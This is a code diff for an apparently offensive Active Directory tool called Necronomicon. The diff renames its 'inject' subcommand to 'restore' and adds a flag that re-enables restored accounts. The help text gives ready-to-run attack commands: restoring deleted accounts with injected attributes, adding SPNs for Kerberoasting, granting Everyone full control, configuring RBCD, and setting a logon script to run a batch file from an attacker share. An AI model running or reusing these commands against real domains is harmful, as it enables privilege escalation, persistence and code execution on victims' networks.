@@ -5,7 +5,7 @@ Necronomicon - AD Recycle Bin enumeration and exploitation tool.
 Subcommands:
     enum-access  Enumerate who can access the Recycle Bin (low-privilege)
     enum-bin     Enumerate deleted objects in the Recycle Bin (requires access)
-    inject       Restore a deleted object with injected attributes
+    restore      Restore a deleted object from the Recycle Bin
 """
 
 import sys
@@ -18,7 +18,7 @@ from necronomicon.auth import Auth, AuthenticationError
 from necronomicon.connection import LDAPSession
 from necronomicon.enum_access import AccessEnumerator
 from necronomicon.enum_bin import BinEnumerator, write_output
-from necronomicon.inject import build_changes, run_inject
+from necronomicon.inject import build_changes, run_restore
 
 
 def add_common_args(parser):
@@ -200,16 +200,9 @@ def cmd_enum_bin(args):
     write_output(result, outfile)
 
 
-def cmd_inject(args):
+def cmd_restore(args):
     if not args.target:
         logging.error('--target is required')
-        return 1
-
-    has_changes = (args.set_attr or args.add_attr or args.del_attr or
-                   args.sd_everyone or args.sd_principal or args.sd_rbcd)
-    if not has_changes:
-        logging.error('No attributes to inject. Use --set, --add, --del, '
-                      '--sd-everyone, --sd-principal, or --sd-rbcd')
         return 1
 
     auth = build_auth(args)
@@ -228,37 +221,41 @@ def cmd_inject(args):
         logging.error('%s', e)
         return 1
 
-    ok = run_inject(session, args.target, changes,
+    ok = run_restore(session, args.target, changes,
                     target_ou=args.target_ou,
-                    new_name=args.restore_name)
+                    new_name=args.restore_name,
+                    enable=args.enable)
     return 0 if ok else 1
 
 
-INJECT_EXAMPLES = """
+RESTORE_EXAMPLES = """
 examples:
-  # Restore with arbitrary attributes
-  necronomicon inject -d corp.local -u admin -k --target victim \\
+  # Plain restore (no attribute injection)
+  necronomicon restore -d corp.local -u admin -k --target victim
+
+  # Restore with injected attributes
+  necronomicon restore -d corp.local -u admin -k --target victim \\
     --set userAccountControl=544 --set pwdLastSet=0
 
   # Add an SPN for Kerberoasting
-  necronomicon inject -d corp.local -u admin -k --target victim \\
+  necronomicon restore -d corp.local -u admin -k --target victim \\
     --add servicePrincipalName=MSSQLSvc/db.corp.local:1433
 
   # Inject Everyone:FullControl DACL
-  necronomicon inject -d corp.local -u admin -k --target victim \\
+  necronomicon restore -d corp.local -u admin -k --target victim \\
     --sd-everyone
 
   # RBCD injection (builds the binary SD automatically)
-  necronomicon inject -d corp.local -u admin -k --target comp$ \\
+  necronomicon restore -d corp.local -u admin -k --target comp$ \\
     --sd-rbcd S-1-5-21-...-1234
 
   # Restore into a specific OU with a new name
-  necronomicon inject -d corp.local -u admin -k --target victim \\
+  necronomicon restore -d corp.local -u admin -k --target victim \\
     --set scriptPath='\\\\attacker\\share\\run.bat' \\
     --target-ou 'OU=Servers,DC=corp,DC=local' --restore-name svc_backup
 
   # Combine multiple injections in one restore
-  necronomicon inject -d corp.local -u admin -k --target victim \\
+  necronomicon restore -d corp.local -u admin -k --target victim \\
     --set userAccountControl=528384 \\
     --add servicePrincipalName=HTTP/web.corp.local \\
     --sd-everyone
@@ -285,11 +282,11 @@ def main():
     p_bin.add_argument('-o', '--output', default=None,
                        help='Output file (default: deleted_objects.json)')
 
-    # ── inject ──
-    p_inject = subparsers.add_parser('inject',
-        help='Restore a deleted object with injected attributes',
+    # ── restore ──
+    p_inject = subparsers.add_parser('restore',
+        help='Restore a deleted object from the Recycle Bin',
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=INJECT_EXAMPLES)
+        epilog=RESTORE_EXAMPLES)
     add_common_args(p_inject)
     p_inject.add_argument('--target', required=True,
                           help='Deleted object to target (GUID, SID, sAMAccountName, or name)')
@@ -297,6 +294,8 @@ def main():
                           help='Override restore location (target OU DN)')
     p_inject.add_argument('--restore-name', default=None,
                           help='Override restored object RDN')
+    p_inject.add_argument('--enable', action='store_true',
+                          help='Enable the account by clearing ACCOUNTDISABLE in UAC')
 
     # Generic attribute injection
     p_inject.add_argument('--set', dest='set_attr', action='append', metavar='ATTR=VALUE',
@@ -331,8 +330,8 @@ def main():
             cmd_enum_access(args)
         elif args.command == 'enum-bin':
             cmd_enum_bin(args)
-        elif args.command == 'inject':
-            return cmd_inject(args)
+        elif args.command == 'restore':
+            return cmd_restore(args)
     except AuthenticationError as e:
         logging.error('Authentication failed: %s', e)
         return 1
